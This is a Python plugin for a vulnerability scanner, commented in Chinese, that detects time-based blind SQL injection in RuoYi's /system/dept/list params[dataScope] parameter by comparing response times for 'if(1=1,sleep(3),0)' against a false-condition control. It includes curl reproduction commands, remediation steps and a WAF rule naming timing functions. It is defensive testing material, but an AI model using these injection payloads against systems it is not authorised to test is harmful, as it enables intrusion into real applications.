"""若依 /system/dept/list 的 params[dataScope] 参数时间盲注检测（CNVD-2021-01931）。

同端点已有回显型插件（sql_inject_dept），但它的判定依赖 MySQL 报错文案回显
（`XPATH syntax error` / `运行时异常`）。生产站点普遍关闭报错回显，此时回显型
插件只会落 SAFE——而 SAFE 的语义是「确认不存在」，是最危险的假安全感。

本插件只看「条件是否被服务端求值」这一个布尔事实：同一请求形状，条件为真睡
`DELAY_SECONDS`，条件为假不睡。两组耗时差即求值证据。**不做任何数据提取**：
不查 database()、不读表、不写文件、不执行系统命令。
"""

import time

from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult, UnknownReason
from core.http import host_of, join_url
from lib.colors import no, ok
from lib.output import emit
from lib.reachability import login_wall_evidence, login_wall_reason
from lib.timing import DELAY_SECONDS, classify, measure, median
from plugins.base import PluginBase

# 两个 payload 的请求形状完全一致，只差一个恒真/恒假条件：
# 这样任何语法解析差异、参数长度差异、WAF 规则差异都被消掉，
# 耗时差只可能来自 if() 条件是否被求值。
PROBE = "and if(1=1,sleep(3),0)"  # 条件为真 → 睡 3 秒
CONTROL = "and if(1=2,sleep(3),0)"  # 同一请求形状，条件为假 → 不睡


class SqlBlindTimePlugin(PluginBase):
    name = "时间盲注（dept）"
    cve = "CNVD-2021-01931"
    severity = "high"
    category = "vuln"
    # 使用共享高权会话；未认证时引擎会降级
    requires_auth = True
    description = (
        "/system/dept/list 的 params[dataScope] 参数被拼接进 SQL，"
        "通过 if(1=1,sleep(3),0) 是否被服务端求值判定盲注（不依赖报错回显，不做数据提取）"
    )
    fix = "对 dataScope 参数做白名单校验，禁止拼接 SQL，使用参数化查询"
    fix_detail = (
        "【升级方案】升级 RuoYi 至 4.6.0+（该版本已修复 params[dataScope] 注入）\n"
        "  git pull https://gitee.com/y_project/RuoYi.git\n"
        "  mvn clean package -Pprod\n"
        "【代码修复】修改 SysDeptMapper.xml，对 dataScope 参数做白名单校验：\n"
        "  - 修改前：${params.dataScope}（直接拼接）\n"
        '  - 修改后：使用 DataScopeUtil.checkDataScope(params.get("dataScope")) 白名单校验\n'
        "【配置加固】关闭数据库报错回显（虽不能修复盲注，但可降低信息泄露面）\n"
        "  server.error.include-message: never\n"
        "【WAF 规则】拦截 dataScope 参数中的 sleep(/if(/benchmark( 等时序函数\n"
        "【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 输入校验"
    )
    reproduce = (
        'curl -X POST "http://target/system/dept/list" \\\n'
        '  -H "Content-Type: application/x-www-form-urlencoded" \\\n'
        '  -H "Accept: application/json" \\\n'
        '  -d "params[dataScope]=and if(1=1,sleep(3),0)" \\\n'
        '  --cookie "<高权会话 Cookie>"\n'
        "\n"
        "# 对照组（条件恒假，不应延迟）：\n"
        'curl -X POST "http://target/system/dept/list" \\\n'
        '  -H "Content-Type: application/x-www-form-urlencoded" \\\n'
        '  -d "params[dataScope]=and if(1=2,sleep(3),0)" \\\n'
        '  --cookie "<高权会话 Cookie>"\n'
        "\n"
        "# 预期响应：注入请求耗时约 3 秒（对照组为正常耗时），"
        "说明 if() 条件在服务端被求值 → 存在 SQL 注入"
    )
    # 版本范围依据同 sql_inject_dept.py:44-55 的源码复核结论
    # （SysDeptController.list 无 @DataScope 注解 → params[dataScope] 直通 mapper 拼接）
    affected_versions = ">=3.0"
    cvss_vector = "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
    compliance = "等保2.0:8.1.3;OWASP:A03:2021"
    vuln_type = "sqli"
    supports_waf_bypass = True

    def _headers(self, target: str):
        """请求头：与 sql_inject_dept 的实测结论对齐（关键项见各条注释）。"""
        return {
            "Host": host_of(target),
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Upgrade-Insecure-Requests": "1",
            "sec-ch-ua": "Chromium;v=122, Not(A:Brand;v=24, Google Chrome;v=122",
            # close 而非 keep-alive：复用连接偶发返回空响应体（sql_inject_dept 实测）
            "Connection": "close",
            "Sec-Fetch-Dest": "document",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
            # 不显式设置空 Cookie：会覆盖 SessionManager 登录拿到的会话 Cookie
            "sec-ch-ua-mobile": "?0",
            "Sec-Fetch-User": "?1",
            "sec-ch-ua-platform": "Windows",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            # 只声明客户端确实能解码的编码（brotli 未装时解不开响应体）
            "Accept-Encoding": "gzip, deflate",
        }

    def verify(self, target, session):
        """双向差分时间盲注判定：条件为真 vs 条件为假的响应耗时差。

        @param target: 目标站点根 URL
        @param session: 共享 HTTP 会话（需高权；未认证由引擎降级）
        @return: ScanResult——耗时差证明 if() 被求值则 CONFIRMED；无额外延迟则 SAFE；
                 超时/中间地带一律 UNKNOWN（不把「没测到」写成「不存在」）
        """
        url = join_url(target, "/system/dept/list")
        # 1. 预算检查：先算账再花钱。一轮约 20-25s，预算不够就不发请求直接 UNKNOWN
        deadline = getattr(session, "deadline", None)
        # 最坏一轮 = 1 次前置 + 3 次对照组 + 3 次探测组 + 2 次补采样 = 8 次请求，
        # 每次最多 sleep(3) 再加网络耗时 → 按 DELAY_SECONDS*8 + 1s 余量估算（约 25s），
        # 否则预算只够 14s 时会实际超支到 24s 以上。
        need = DELAY_SECONDS * 8 + 1
        if deadline is not None and time.monotonic() + need > deadline:
            emit(no("时间盲注（dept）：剩余时间预算不足，未执行"))
            return ScanResult(
                kind="info",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=url,
                unknown_reason=UnknownReason.BUDGET_EXCEEDED.value,
                evidence="剩余时间预算不足一轮时序探测（约 25s），未执行",
            )

        headers = self._headers(target)
        control_data = {"params[dataScope]": CONTROL}
        probe_data = {"params[dataScope]": PROBE}

        # 2. 前置一次 CONTROL（不参与计时）：登录墙/拒绝/不可达时不进入 20 秒探测
        try:
            preflight = session.post(url, headers=headers, data=control_data)
        except Exception as e:
            emit(no("时间盲注（dept）：前置请求异常"))
            return ScanResult(
                kind="info",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=url,
                unknown_reason=UnknownReason.UNREACHABLE.value,
                evidence=f"前置请求失败，无法判定时间盲注是否存在：{e}",
            )

        # 真实若依未认证是 302 → /login（跟随后 200 登录页），不是 401
        wall = login_wall_reason(preflight)
        if wall:
            emit(no("时间盲注（dept）：登录墙拦截，未进入时序探测"))
            return ScanResult(
                kind="info",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=url,
                unknown_reason=UnknownReason.AUTH_WALL.value,
                evidence=login_wall_evidence(wall, "时间盲注是否存在"),
            )
        # 若依鉴权失败是 HTTP 200 + {"code":401}，状态码与业务码都要看
        why = f"HTTP {preflight.status_code}" if preflight.status_code in (401, 403, 429) else ""
        body = (preflight.text or "")[:400]
        if not why and any(f'"code": {c}' in body or f'"code":{c}' in body for c in ("401", "403", "429")):
            why = "业务码 401/403/429（认证失败）"
        if why:
            emit(no("时间盲注（dept）：端点拒绝访问，未进入时序探测"))
            return ScanResult(
                kind="info",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=url,
                unknown_reason=UnknownReason.DENIED.value,
                evidence=f"前置请求被拒绝（{why}），无法判定时间盲注是否存在",
            )

        # 3. 采样：对照组 ×3、探测组 ×3（形状完全相同，只差恒真假条件）
        baseline_samples = [measure(session, "POST", url, headers=headers, data=control_data) for _ in range(3)]
        baseline_valid = [x for x in baseline_samples if x is not None]
        if not baseline_valid:
            emit(no("时间盲注（dept）：对照组全部超时"))
            return ScanResult(
                kind="info",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=url,
                unknown_reason=UnknownReason.UNREACHABLE.value,
                evidence="对照组 3 次请求全部失败或超时，无法取得基线耗时",
            )
        baseline = median(baseline_valid)

        probes = [measure(session, "POST", url, headers=headers, data=probe_data) for _ in range(3)]
        # 抗一次抖动：3 次里恰好 2 次成立 → 再补 2 次，用 5 次中位数重判
        hits = sum(1 for x in probes if x is not None and x - baseline >= DELAY_SECONDS * 0.5)
        if len(probes) == 3 and hits == 2:
            probes.extend(measure(session, "POST", url, headers=headers, data=probe_data) for _ in range(2))

        verdict = classify(baseline, probes)
        probe_valid = [x for x in probes if x is not None]
        probe_median = median(probe_valid)

        # 4. 判定
        if verdict == "confirmed":
            emit(ok("存在时间盲注（dept）"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence=(
                    f"注入请求中位数 {probe_median:.2f}s，对照中位数 {baseline:.2f}s，"
                    f"延迟 {probe_median - baseline:.2f}s，证明 if() 条件被服务端求值"
                ),
                extra={"vuln_type": "sqli", "payload_class": "time_if"},
                fix=self.fix,
            )

        if verdict == "safe":
            emit(no("不存在时间盲注（dept）"))
            return ScanResult(
                kind="info",
                name=self.name,
                status=STATUS_SAFE,
                url=url,
                evidence=(
                    f"注入条件下无额外延迟，且对照组与探测组一致"
                    f"（探测中位数 {probe_median:.2f}s / 对照中位数 {baseline:.2f}s）"
                ),
            )

        # unknown：出现 None → 请求没拿到有效响应；否则是落在中间地带
        has_timeout = any(x is None for x in probes)
        reason = UnknownReason.UNREACHABLE.value if has_timeout else UnknownReason.INSUFFICIENT_EVIDENCE.value
        emit(no("时间盲注（dept）：耗时差无法归因，判 UNKNOWN"))
        return ScanResult(
            kind="info",
            name=self.name,
            status=STATUS_UNKNOWN,
            url=url,
            unknown_reason=reason,
            evidence=(
                f"时序差分不足以判定（探测中位数 {probe_median:.2f}s / 对照中位数 {baseline:.2f}s，"
                f"期望延迟 {DELAY_SECONDS:.1f}s）"
                + ("，且存在超时采样" if has_timeout else "，落在「确认」与「无延迟」之间的中间地带")
            ),
        )
